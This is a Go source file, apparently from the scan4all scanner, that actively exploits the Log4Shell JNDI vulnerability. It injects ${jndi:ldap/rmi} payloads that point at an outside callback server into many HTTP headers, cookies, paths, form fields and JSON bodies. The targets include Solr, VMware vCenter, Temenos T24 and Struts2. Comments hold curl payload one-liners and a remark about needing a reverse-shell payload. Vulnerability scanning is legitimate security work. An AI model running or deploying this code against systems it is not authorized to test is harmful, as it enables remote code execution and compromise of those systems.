package log4j

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"github.com/GhostTroops/scan4all/pkg/jndi"
	"github.com/hktalent/PipelineHttp"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

// https://github.com/u21h2/nacs
// https://192.168.10.198/ui/#/login
// http://127.0.0.1:8983/solr/admin/cores?action=(){:;}{$:;$}{jndi:rmi${{::-:}}}//docker.for.mac.localhost:1099/UpX34defineClass}
// http://127.0.0.1:8983/solr/admin/cores?action=${jndi:${rmi://docker.for.mac.localhost:1099/UpX34defineClass}}
var UrlPayload = []string{"/solr/admin/cores?action=${jndi:%s}"}

var RegVCenter = regexp.MustCompile(`(http.*?\?SAMLRequest=)`)

func CheckX3(u string) bool {
	if oU, err := url.Parse(u); nil == err {
		a := []string{oU.Scheme + "://" + oU.Host + "/x3.jsp"}

		for _, k := range a {
			if r, err := util.DoPost(k, map[string]string{}, strings.NewReader("")); nil == err {
				defer r.Body.Close()
			}
		}

	}
	return false
}

// log4j漏洞
// Temenos T24 还没有找到目标测试
// https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell?referrer=featured
func CheckTemenosT24(u string) {
	log.Printf("start test CheckTemenosT24 %s\n", u)
	if oU, err := url.Parse(u); nil == err {
		szUrl := oU.Scheme + "://" + oU.Host + "/BrowserWeb/servlet/BrowserServlet"
		burp0Headers := map[string]string{"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": oU.Scheme + "://" + oU.Host + "/BrowserWeb/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
		if r, err := util.DoGet(szUrl, burp0Headers); nil == err {
			defer r.Body.Close()
			if a := r.Header.Get("Set-Cookie"); "" != a {
				szUrl = oU.Scheme + "://" + oU.Host + "/BrowserWeb/servlet/FileUploadServlet"
				if c1 := util.GetClient(szUrl); nil != c1 {
					defer c1.Close()
					for _, x1 := range log4jJndiPayloads {
						c1.SendFiles(c1.Client, szUrl, &map[string]interface{}{"uploadType": x1}, &[]PipelineHttp.PostFileData{PipelineHttp.PostFileData{Name: "uploadType", FileName: "test", FileData: strings.NewReader(x1)}}, func(resp *http.Response, err error, szU string) {
						}, func() map[string]string {
							return map[string]string{"Cookie": a, "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0", "Connection": "close"}
						})
					}
				}
			}
		}
	}
}

// 这里可以考虑对host进行编码，避免明文传输
func SetLdapHost(s string) string {
	return fmt.Sprintf(util.GetVal("ldapServer"), s)
}

// log4j漏洞
// 当前能上传jsp，但是不能解析、执行，需要定制 reverse shell的 payload
func Solr(u string) {
	log.Printf("start test Solr %s\n", u)
	if oU, err := url.Parse(u); nil == err {
		for _, k := range UrlPayload {
			k = fmt.Sprintf(k, SetLdapHost(oU.Host))
			szUrl := oU.Scheme + "://" + oU.Host + k
			if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
				defer r.Body.Close()
			}
		}
	}
}

// log4j漏洞
// https://www.sprocketsecurity.com/resources/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
func VCenter(u string) bool {
	log.Printf("start test VCenter %s\n", u)
	if oU, err := url.Parse(u); nil == err {
		szUrl := oU.Scheme + "://" + oU.Host + "/ui/login"
		if r, err := util.DoGet(szUrl, map[string]string{}); nil == err {
			defer r.Body.Close()
			if a := r.Header.Get("Location"); "" != a {
				if x := RegVCenter.FindAllString(a, -1); 0 < len(x) && -1 < strings.Index(x[0], "SAML2/SSO") {
					ldapServer := "${jndi:" + SetLdapHost(oU.Host) + "}"
					util.DoGet(x[0], map[string]string{
						"X-Forwarded-For": ldapServer,
					})
				}
			}
		}
	}
	return false
}

// log4j盲大全套
func Check(u string, finalURL string) bool {
	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
		var host = "null"
		randomstr := "UpX34defineClass" //util.RandomStr()
		if ux, err := url.Parse(strings.TrimSpace(u)); err == nil {
			host = strings.Replace(ux.Host, ":", ".", -1)
		}
		oU, _ := url.Parse(finalURL)
		domainx, intputs := getinputurl(finalURL)
		domainx = append(domainx, u)
		intputs = append(intputs, "x")
		for _, domain := range domainx {
			for _, payload := range log4jJndiPayloads {
				var uri string
				if jndi.JndiAddress != "" {
					uri = jndi.JndiAddress + "/" + randomstr
				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
					uri = randomstr + "." + host + "." + util.CeyeDomain
				}
				payload = strings.Replace(payload, "dnslog-url", uri, -1)
				log.Printf("start test %s %s\n", u, payload)
				header := make(map[string]string)
				header["Content-Type"] = "application/x-www-form-urlencoded"
				header["User-Agent"] = payload
				// docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
				header["X-Api-Version"] = payload
				//log.Println("payload", payload)
				/* struts2 对静态文件 进行处理 If-Modified-Since，struts2默认静态文件
				tooltip.gif
				domtt.css
				utils.js
				domTT.js
				inputtransfersselect.js
				optiontransferselect.js
				curl -vv -H "If-Modified-Since: \${jndi:ldap://localhost:80/abc}" http://localhost:8080/struts2-showcase/struts/utils.js
				*/
				header["If-Modified-Since"] = payload
				header["Referer"] = payload
				header["X-Client-IP"] = payload
				header["X-Remote-IP"] = payload
				header["X-Remote-Addr"] = payload
				header["X-Forwarded-For"] = payload
				header["X-Originating-IP"] = payload
				header["Originating-IP"] = payload
				header["CF-Connecting_IP"] = payload
				header["True-Client-IP"] = payload
				header["Originating-IP"] = payload
				header["X-Real-IP"] = payload
				header["Forwarded"] = payload
				header["X-Wap-Profile"] = payload
				header["Contact"] = payload
				header["Forwarded"] = payload
				header["X-Device"] = payload
				header["Token"] = payload
				header["Cookie"] = "JSESSIONID=" + payload
				// 包含strus2 根目录
				_, err := util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
				if nil != err {
					log.Println("POST", domain+"/"+payload, err)
				}
				_, err = util.HttpRequset(domain, "GET", "", false, header)
				if nil != err {
					log.Println("GET", domain, err)
				}
				_, _ = util.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
				_, _ = util.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)

				/* stuts2 截取、保留第一级目录，两次payload url path
				curl -vv http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
				http://127.0.0.1:8080/$%7Bjndi:ldap://docker.for.mac.localhost:1389/UpX34defineClass%7D/xx.action
				*/
				// struts2 第二级目录处理
				if oU.Path != "" {
					if a01 := strings.Split(oU.Path, "/"); 1 < len(a01) {
						_, _ = util.HttpRequset(domain+"/"+a01[0]+"/"+payload, "GET", "", false, header)
					}
				}
				header["Content-Type"] = "application/json"
				_, _ = util.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
			}
		}
		if jndi.JndiAddress != "" {
			if jndi.Jndilogchek(randomstr) {
				util.SendLog(finalURL, "log4j", "Found vuln Log4J JNDI RCE", "")
				return true
			}
		}
		if util.CeyeApi != "" && util.CeyeDomain != "" {
			if util.Dnslogchek(randomstr) {
				util.SendLog(finalURL, "log4j", "Found vuln Log4J JNDI RCE", "")
				return true
			}
		}
	}
	return false
}

func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
	req, err := util.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil, nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = util.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil, nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if util.StrContains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(strings.TrimSpace(domainurl))
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if util.StrContains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(strings.TrimSpace(domainurl))
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	inputreg := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?)['"].*?>`).FindAllStringSubmatch(req.Body, -1)
	for _, intput := range inputreg {
		inputlist = append(inputlist, intput[1])
	}
	return loginurl, inputlist
}
